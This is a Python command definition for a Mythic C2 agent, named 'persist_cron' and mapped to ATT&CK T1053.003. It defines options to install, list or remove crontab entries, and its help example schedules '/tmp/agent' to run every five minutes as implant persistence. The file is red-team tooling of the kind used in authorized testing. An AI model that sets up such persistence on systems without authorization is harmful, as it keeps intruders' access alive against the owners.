from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class PersistCronArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["install", "list", "remove"],
                default_value="install",
                description="install, list, or remove crontab entries",
            ),
            CommandParameter(
                name="schedule",
                type=ParameterType.String,
                default_value="*/5 * * * *",
                description="Cron schedule expression (e.g. '*/5 * * * *' for every 5 minutes)",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="command",
                type=ParameterType.String,
                default_value="",
                description="Command to execute on schedule",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class PersistCronCommand(CommandBase):
    cmd = "persist_cron"
    needs_admin = False
    help_cmd = "persist_cron -action install -schedule '*/5 * * * *' -command '/tmp/agent'"
    description = "Install, list, or remove crontab persistence entries."
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1053.003"]
    argument_class = PersistCronArguments
    attributes = CommandAttributes(builtin=False, supported_os=[SupportedOS.Linux])

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )
        action = taskData.args.get_arg("action")
        if action == "install":
            sched = taskData.args.get_arg("schedule")
            cmd = taskData.args.get_arg("command")
            response.DisplayParams = f"{action}: {sched} {cmd}"
        else:
            response.DisplayParams = action
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
